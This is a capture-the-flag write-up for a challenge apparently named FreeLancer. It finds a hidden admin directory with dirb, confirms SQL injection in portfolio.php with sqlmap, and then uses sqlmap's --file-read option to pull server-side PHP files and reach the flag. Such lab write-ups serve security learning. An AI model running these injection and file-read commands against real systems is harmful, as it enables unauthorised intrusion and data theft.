# FreeLancer
![Screenshot from 2021-08-16 17-56-39](https://user-images.githubusercontent.com/87865134/129553366-2dd0e7e3-e195-4809-aad5-839d1d69786c.png)

##  Information gathering
- Use `dirb` to find hidden directories and files
```
dirb http://139.59.166.56:30387/
```
![Screenshot from 2021-08-16 18-17-02](https://user-images.githubusercontent.com/87865134/129555520-6fd78927-00e8-44bc-a6cd-b7ff707ccc20.png)


> Found hidden directory `administrat`

- View source code => found url `portfolio.php?id=1`

![Screenshot from 2021-08-16 17-57-21](https://user-images.githubusercontent.com/87865134/129553541-f63e8b12-226e-4bf8-b425-bca70168eccf.png)

##  Analysis vulnerabilities
- Test **SQLi** in url `/portfolio.php?id=1`
  - use `sqlmap`

  ``` 
  sqlmap -u "http://139.59.166.56:30387/portfolio.php?id=1" 
  ```
  > => SQLi

![Screenshot from 2021-08-16 18-04-59](https://user-images.githubusercontent.com/87865134/129554258-f54a31b5-7375-4698-b77f-173264ba21f5.png)

- Navigate to url `/administrat/` 

![Screenshot from 2021-08-16 18-07-14](https://user-images.githubusercontent.com/87865134/129554493-488b2528-1a62-474c-8470-46de99f2ab1c.png)

> `/administrat/` has file `index.php` 

##  Exploit
- Use `sqlmap` to read file `index.php` in directory `/administrat/`
```
sqlmap -u "http://139.59.166.56:30387/portfolio.php?id=1" --file-read=/var/www/html/administrat/index.php
```
![Screenshot from 2021-08-16 18-09-41](https://user-images.githubusercontent.com/87865134/129554772-40eb4f08-e3fe-4b11-a861-4e239df82dbc.png)

> file is saved in `/home/ndqk/.local/share/sqlmap/output/139.59.166.56/files/_var_www_html_administrat_index.php `

- open file to read   

![Screenshot from 2021-08-16 18-11-27](https://user-images.githubusercontent.com/87865134/129554974-d7887c54-e518-4114-9ab5-a2576234c0fd.png)

- Code:
```php
if(isset($_SESSION["loggedin"]) && $_SESSION["loggedin"] === true){
  header("location: panel.php");
  exit;
}
```
> if login successfully then go to `panel.php` => `panel.php` may contain sensitive data

- Use `sqlmap` to read file `panel.php`
```
sqlmap -u "http://139.59.166.56:30387/portfolio.php?id=1" --file-read=/var/www/html/administrat/panel.php
```
![Screenshot from 2021-08-16 18-15-14](https://user-images.githubusercontent.com/87865134/129555336-1ba30512-8281-420b-b66f-eb8b9802b8b0.png)

![Screenshot from 2021-08-16 18-19-30](https://user-images.githubusercontent.com/87865134/129555787-6176cbe9-2134-4274-9da2-46b175b9d4e6.png)

> Found flag

##  Description
> **category:** SQL injection
